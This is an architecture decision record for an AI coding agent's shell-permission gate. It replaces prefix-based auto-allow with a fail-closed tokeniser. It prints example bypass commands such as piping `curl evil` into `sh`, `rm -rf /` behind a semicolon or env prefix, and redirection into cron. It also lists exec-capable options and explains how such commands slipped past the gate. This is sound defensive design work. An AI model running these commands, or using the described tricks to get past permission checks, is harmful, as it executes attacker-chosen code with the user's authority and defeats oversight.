# 0059 — Permission tokeniser: metacharacters fail closed

Date: 2026-09-02
Status: accepted (under the umbrella of ADR 0057, the shell-first native
loop; the authority boundary itself is ADR 0060, the `os` sandbox)

## Context

The native loop decided shell commands from the raw command string:

- `grant_key` (`src/core/perm.c`) took the first whitespace token with
  `sscanf("%127s")`. `FOO=1 rm -rf /` keyed as `FOO=1`, `(rm -rf ~)` keyed as
  `(rm`, and one "yes, don't ask again" for `git status` covered `git push` —
  the exact pair `docs/features/permissions.md` uses as its deny example.
- The `auto` heuristic matched a **prefix** of the command against a list of
  read-only programs. `cat x && curl evil | sh` starts with `cat`, so it was
  auto-allowed and ran. So were `ls; rm -rf /`, `cat $(curl evil)`,
  `grep TODO > /etc/cron.d/x`, `find . -delete`, and `catx --evil` (a prefix,
  not a word).

This is the shape of nine published Claude Code permission-bypass CVEs:
command chaining, command substitution, redirection, env-assignment prefixes,
and option injection past an allowlisted argv0. A false-positive **deny**
costs one prompt; a false-positive **allow** executes attacker-chosen code
with the user's authority.

The default permission mode is `yolo` (ADR 0001) where none of this runs, but
`ask`/`auto` exist precisely for users who want the gate, and ADR 0057 makes
the shell the primary tool surface — every command now flows through here.

## Decision

1. **A tokeniser, not a shell.** `src/core/shlex.c` (`shlex_parse`) walks a
   command line with POSIX quoting rules — single quotes literal, double
   quotes with `\` escapes, backslash escapes — and reports: `argv0`, the
   first non-option word (`verb`), and four fail-closed flags: `meta`
   (unquoted `; & | ( ) < > \` $` newline, a leading `#` or `{`, or a `\`
   line continuation), `env_prefix` (a leading `NAME=VALUE`), `unterminated`
   (unbalanced quote or trailing backslash), `truncated` (a word over
   `SHLEX_TOK_MAX`). `$` and backtick count as metacharacters **inside**
   double quotes too, because expansion survives them. It never expands,
   never executes, and allocates nothing.
2. **Simple or nothing.** `shlex_is_simple()` is true only for one simple
   command with a usable `argv0` and none of those flags. A command that is
   not simple can never be auto-allowed and can never be covered by a
   program-wide session grant.
3. **`auto` allows one simple read.** A single simple command whose program
   is in the read-only set (`ls cat head tail wc grep rg find`, plus `git`
   with subcommand `status|log|diff|show`) and which carries no exec-capable
   option (anything containing `exec`, plus `-delete -ok -okdir -fprintf
   -fls -fprint -fprint0 --pre --pre-glob --hostname-bin`) is allowed.
   Everything else prompts. Program comparison is exact, so `catx` is not
   `cat`.
4. **Only trusted paths resolve to a program name.** `shlex_program()`
   returns the basename for a bare word or for an absolute path in a system
   bin directory (`/bin`, `/usr/bin`, `/usr/local/bin`, `/sbin`, `/usr/sbin`,
   `/opt/homebrew/bin`); `./ls` and `/tmp/x/ls` resolve to nothing and
   prompt.
5. **Grant keys carry the subcommand.** A simple command keys as
   `bash:<program>`, or `bash:<program> <verb>` for the multi-verb programs
   `git npm cargo make docker gh`: a grant for `git status` does not cover
   `git push`. A non-simple command keys on the **exact line**
   (`bash!<line>`), so "don't ask again" for `cat x && curl evil | sh`
   authorizes that byte sequence and nothing else.
6. **Rules are untouched.** `permission` rules keep matching the raw command
   line with globs, before grants and before the heuristic. A deny still
   catches a substring inside a compound command; an allow rule is an
   explicit human decision and keeps its reach.
7. **Not a security boundary.** argv classification is a UX accelerator. The
   boundary is the OS sandbox (ADR 0060). `docs/features/permissions.md` says
   so in those words, and also that path-precise `edit` rules bind typed
   tools, `tny edit`, and the sandbox write set — not arbitrary writes a
   shell command performs.

## Consequences

- Commands that used to slip through `auto` now prompt. That is the point;
  the cost is one extra prompt in opt-in modes, never a blocked command in
  the default `yolo` mode.
- Some honest commands lose auto-allow: `grep TODO > out`, `ls ~/$DIR`,
  `tail -f log | grep x`, `git -C /repo status`. They prompt once, and a
  grant (or a rule) covers the shape thereafter.
- `shlex` is deliberately smaller than a shell. It does not model here-docs,
  arrays, `case`, or aliases; every construct it does not model reaches it as
  a metacharacter or as `truncated`, and therefore prompts.
- **wasm: works.** `shlex.c` is pure C11 with no syscalls and builds in
  `SRC_SHARED`; the wasm build carries the same decisions, and the terminal
  tool's own availability is unchanged by this ADR.
- Verified by `tests/test_perm.c` (18 tests: quoting, escapes, every
  metacharacter, the assignment-name grammar boundary by boundary, option
  injection, trusted paths, truncation in each quoting form, grant scoping,
  deny reach, rule categories) and by a `tests/mutation/mutate.py` target
  (`--focus perm-tokeniser`) covering all of `src/core/shlex.c` plus
  `grant_key`, `grant_key_bash`, `multi_verb`, `rule_category` and
  `perm_check`. The first run over that target killed 132 of 174 valid
  mutants (75.9%); the survivors were character-class, escape-set and
  buffer-bound edges, and the tests above were written to close them. The
  re-run kills 171 of 173 (98.8%). The two remaining mutants are equivalent
  and cannot be killed: relaxing the option-name copy bound in
  `dangerous_option` is unreachable (a token is at most `SHLEX_TOK_MAX - 1`
  bytes), and reading `cmd[i - 1]` instead of `cmd[i + 1]` in the
  double-quote escape guard decides the same way at every reachable index.
  `take_word`'s word counter is annotated as equivalent in `EQUIVALENT`
  because the index is only ever compared against 0.
